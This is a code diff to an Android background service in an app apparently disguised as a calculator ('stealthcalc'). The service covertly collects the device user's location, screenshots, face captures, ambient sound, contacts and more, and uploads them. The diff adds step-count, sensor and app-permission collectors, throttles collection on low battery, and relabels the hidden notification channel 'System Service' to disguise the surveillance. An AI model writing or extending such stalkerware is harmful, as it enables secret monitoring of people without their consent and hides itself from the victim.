@@ -22,7 +22,10 @@ import com.stealthcalc.monitoring.collector.DataUsageCollector
 import com.stealthcalc.monitoring.collector.DeviceInfoCollector
 import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
 import com.stealthcalc.monitoring.collector.GeofenceCollector
+import com.stealthcalc.monitoring.collector.AppPermissionsCollector
 import com.stealthcalc.monitoring.collector.InstalledAppsCollector
+import com.stealthcalc.monitoring.collector.SensorCollector
+import com.stealthcalc.monitoring.collector.StepCountCollector
 import com.stealthcalc.monitoring.collector.FaceCaptureCollector
 import com.stealthcalc.monitoring.collector.FileSyncCollector
 import com.stealthcalc.monitoring.collector.LocationCollector
@@ -37,6 +40,9 @@ import com.stealthcalc.monitoring.collector.WifiHistoryCollector
 import com.stealthcalc.monitoring.service.RemoteCommandHandler
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
+import android.content.Intent as AndroidIntent
+import android.content.IntentFilter
+import android.os.BatteryManager
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
@@ -50,8 +56,10 @@ class AgentService : LifecycleService() {
     companion object {
         private const val CHANNEL_ID = "agent_channel"
         private const val NOTIFICATION_ID = 9002
-        private const val COLLECT_INTERVAL_MS = 60_000L
+        private const val COLLECT_INTERVAL_NORMAL_MS = 60_000L
+        private const val COLLECT_INTERVAL_LOW_BATTERY_MS = 180_000L
         private const val UPLOAD_INTERVAL_MS = 120_000L
+        private const val LOW_BATTERY_THRESHOLD = 20
 
         var isRunning = false
             private set
@@ -89,6 +97,9 @@ class AgentService : LifecycleService() {
     @Inject lateinit var installedAppsCollector: InstalledAppsCollector
     @Inject lateinit var ambientSoundCollector: AmbientSoundCollector
     @Inject lateinit var contactFrequencyCollector: ContactFrequencyCollector
+    @Inject lateinit var stepCountCollector: StepCountCollector
+    @Inject lateinit var sensorCollector: SensorCollector
+    @Inject lateinit var appPermissionsCollector: AppPermissionsCollector
     @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
 
@@ -127,6 +138,8 @@ class AgentService : LifecycleService() {
         deviceSecurityCollector.start()
         faceCaptureCollector.start()
         simChangeCollector.start()
+        stepCountCollector.start()
+        sensorCollector.start()
 
         collectJob?.cancel()
         collectJob = lifecycleScope.launch {
@@ -151,10 +164,11 @@ class AgentService : LifecycleService() {
                     installedAppsCollector.collect()
                     ambientSoundCollector.collect()
                     contactFrequencyCollector.collect()
+                    appPermissionsCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
-                delay(COLLECT_INTERVAL_MS)
+                delay(getSmartInterval())
             }
         }
     }
@@ -192,9 +206,20 @@ class AgentService : LifecycleService() {
         faceCaptureCollector.stop()
         screenshotCollector.release()
         simChangeCollector.stop()
+        stepCountCollector.stop()
+        sensorCollector.stop()
         remoteCommandHandler.stopListening()
         AppLogger.log(this, "[agent]", "Agent service stopped")
         super.onDestroy()
+    }
+
+    private fun getSmartInterval(): Long {
+        val batteryIntent = registerReceiver(null, IntentFilter(AndroidIntent.ACTION_BATTERY_CHANGED))
+        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
+        val percent = if (scale > 0) (level * 100) / scale else 100
+        return if (percent <= LOW_BATTERY_THRESHOLD) COLLECT_INTERVAL_LOW_BATTERY_MS
+        else COLLECT_INTERVAL_NORMAL_MS
     }
 
     override fun onBind(intent: Intent): IBinder? {
@@ -205,11 +230,12 @@ class AgentService : LifecycleService() {
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Monitoring",
+            "System Service",
             NotificationManager.IMPORTANCE_MIN
         ).apply {
             setShowBadge(false)
             lockscreenVisibility = Notification.VISIBILITY_SECRET
+            description = "Required for background operation"
         }
         (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
             .createNotificationChannel(channel)
